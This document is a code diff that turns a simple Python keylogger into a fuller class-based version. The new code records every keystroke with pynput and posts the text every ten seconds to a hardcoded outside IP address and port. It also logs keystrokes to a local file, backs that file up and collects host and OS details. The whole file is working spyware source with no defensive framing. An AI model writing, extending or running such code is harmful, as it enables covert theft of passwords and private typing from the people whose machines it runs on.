@@ -1,68 +1,131 @@
-# Install pynput using the following command: pip install pynput
-# Import the mouse and keynboard from pynput
-from pynput import keyboard
-# We need to import the requests library to Post the data to the server.
-import requests
-# To transform a Dictionary to a JSON string we need the json package.
 import json
-#  The Timer module is part of the threading package.
 import threading
+import requests
+from pynput import keyboard
+import datetime
+import os
+import socket
+import platform
 
-# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
-text = ""
+class Keylogger:
+    def __init__(self, ip_address="109.74.200.23", port_number="8080", time_interval=10):
+        self.ip_address = ip_address
+        self.port_number = port_number
+        self.time_interval = time_interval
+        self.text = ""
+        self.log_file_path = "keylog.txt"
+        self.start_time = datetime.datetime.now()
 
-# Hard code the values of your server and ip address here.
-ip_address = "109.74.200.23"
-port_number = "8080"
-# Time interval in seconds for code to execute.
-time_interval = 10
+    def send_post_req(self):
+        try:
+            payload = json.dumps({"keyboardData": self.text})
+            requests.post(
+                f"http://{self.ip_address}:{self.port_number}",
+                data=payload,
+                headers={"Content-Type": "application/json"}
+            )
+            self.text = ""
+            timer = threading.Timer(self.time_interval, self.send_post_req)
+            timer.start()
+        except:
+            print("Couldn't complete request!")
 
-def send_post_req():
-    try:
-        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
-        # the format {"keyboardData" : "<value_of_text>"}
-        payload = json.dumps({"keyboardData" : text})
-        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
-        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
-        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
-        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
-        timer = threading.Timer(time_interval, send_post_req)
-        # We start the timer thread.
-        timer.start()
-    except:
-        print("Couldn't complete request!")
+    def save_to_file(self):
+        try:
+            with open(self.log_file_path, "a") as file:
+                file.write(self.text)
+            self.text = ""
+        except:
+            print("Couldn't save to file!")
 
-# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
-def on_press(key):
-    global text
+    def display_log_summary(self):
+        try:
+            with open(self.log_file_path, "r") as file:
+                contents = file.read()
+                print("\n--- Keylog Summary ---")
+                print(contents)
+                print("----------------------\n")
+        except FileNotFoundError:
+            print("No log file found.")
 
-# Based on the key press we handle the way the key gets logged to the in memory string.
-# Read more on the different keys that can be logged here:
-# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
-    if key == keyboard.Key.enter:
-        text += "\n"
-    elif key == keyboard.Key.tab:
-        text += "\t"
-    elif key == keyboard.Key.space:
-        text += " "
-    elif key == keyboard.Key.shift:
-        pass
-    elif key == keyboard.Key.backspace and len(text) == 0:
-        pass
-    elif key == keyboard.Key.backspace and len(text) > 0:
-        text = text[:-1]
-    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-        pass
-    elif key == keyboard.Key.esc:
-        return False
-    else:
-        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
-        text += str(key).strip("'")
+    def clear_log(self):
+        try:
+            open(self.log_file_path, "w").close()
+            print("Log file cleared.")
+        except:
+            print("Couldn't clear log file.")
 
-# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
-# In the on_press function we specified how to deal with the different inputs received by the listener.
-with keyboard.Listener(
-    on_press=on_press) as listener:
-    # We start of by sending the post request to our server.
-    send_post_req()
-    listener.join()
+    def get_system_info(self):
+        try:
+            hostname = socket.gethostname()
+            ip = socket.gethostbyname(hostname)
+            system = platform.system()
+            release = platform.release()
+            system_info = f"Hostname: {hostname}\nLocal IP Address: {ip}\nOperating System: {system} {release}\n"
+            print(system_info)
+            return system_info
+        except:
+            print("Couldn't retrieve system info.")
+            return ""
+
+    def timestamp_log(self):
+        try:
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            with open(self.log_file_path, "a") as file:
+                file.write(f"\n--- Log Timestamp: {timestamp} ---\n")
+        except:
+            print("Couldn't write timestamp to log.")
+
+    def check_log_size(self):
+        try:
+            if os.path.exists(self.log_file_path):
+                size_kb = os.path.getsize(self.log_file_path) / 1024
+                print(f"Log file size: {size_kb:.2f} KB")
+        except:
+            print("Couldn't check log file size.")
+
+    def backup_log(self):
+        try:
+            backup_path = f"{self.log_file_path}.bak"
+            if os.path.exists(self.log_file_path):
+                with open(self.log_file_path, "r") as original, open(backup_path, "w") as backup:
+                    backup.write(original.read())
+                print("Log file backed up.")
+        except:
+            print("Couldn't backup log file.")
+
+    def on_press(self, key):
+        try:
+            if key == keyboard.Key.enter:
+                self.text += "\n"
+            elif key == keyboard.Key.tab:
+                self.text += "\t"
+            elif key == keyboard.Key.space:
+                self.text += " "
+            elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
+                pass
+            elif key == keyboard.Key.backspace:
+                self.text = self.text[:-1] if len(self.text) > 0 else self.text
+            elif key == keyboard.Key.esc:
+                self.timestamp_log()
+                self.save_to_file()
+                self.backup_log()
+                self.display_log_summary()
+                self.check_log_size()
+                self.get_system_info()
+                return False
+            else:
+                self.text += str(key).strip("'")
+        except:
+            pass
+
+    def start(self):
+        print(f"Keylogger started at {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
+        self.get_system_info()
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            self.send_post_req()
+            listener.join()
+
+if __name__ == "__main__":
+    keylogger = Keylogger()
+    keylogger.start()
